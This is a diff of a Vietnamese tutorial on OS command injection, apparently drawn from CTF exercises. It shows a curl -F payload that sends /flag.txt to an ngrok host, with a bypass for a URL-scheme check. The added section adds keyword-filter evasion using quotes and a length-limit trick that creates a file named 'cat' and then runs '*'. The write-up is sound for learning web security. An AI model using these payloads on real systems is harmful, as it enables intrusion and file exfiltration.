@@ -26,4 +26,8 @@ Lỗ hỏng OS Command Inject xảy ra khi trong trang web có 1 hàm sử dụn
 cách gửi file đó về server do ta dựng lên. Curl cung cấp option -F cho phép gửi file từ hệ thống. Ta sẽ sử dụng ngrok để tạo 1 server vd `https://4706-113-185-53-154.ngrok-free.app/`  thì trong câu lệnh sẽ là để gửi sẽ là
 `curl -F file=@/flag.txt https://4706-113-185-53-154.ngrok-free.app/` thì suy ra ta chỉ cần thêm vào payload=`-F file=@/flag.txt https://4706-113-185-53-154.ngrok-free.app/` tuy nhiên khi ta ấn gửi request này đi thì nó sẽ
 gửi về thông báo `Only HTTP or HTTPS!` có vẻ hơi lắc leo nhưng ta chỉ cần sửa lại là `curl http:example.com -F file=@flag.txt https://4706-113-185-53-154.ngrok-free.app/` là có thể vượt qua
-##
+## VD3:
+giả sử có 1 trang web dùng để lệnh thực thi từ xa. Nhưng có một số lệnh như: ls, cat, sh,... bị chặn và chỉ được nhập tối đa 4 kí tự như id để xem #id..., nếu nhập lệnh ls vào web thì sẽ có thông báo valid..., thế nhưng tôi sử dụng pypass `l's'` thì nó lại sử dụng được. Tiếp theo đến xử lí phần giới hạn 4 char: thì khi ta nhập `cat flag.txt` thì sẽ không được cho vượt qua length cho phép, ta sẽ sử dụng 1 trick là:     
+  + Bước 1: ta sẽ nhập `>cat` để server tạo ra file cat rỗng
+  + Bước 2: ta sẽ nhập `*` thì lúc này server sẽ gửi về flag ta cần. Thế là ta chỉ cần * để lấy được flag =)). thì kí tự * trong linux sẽ thực hiện ghi tên các file trong folder thì ở 1 lúc nào đó nó sẽ là `cat flag.txt` thì ngay lập tức lệnh sẽ chạy và ta có thể tận dụng lỗi này được.
+
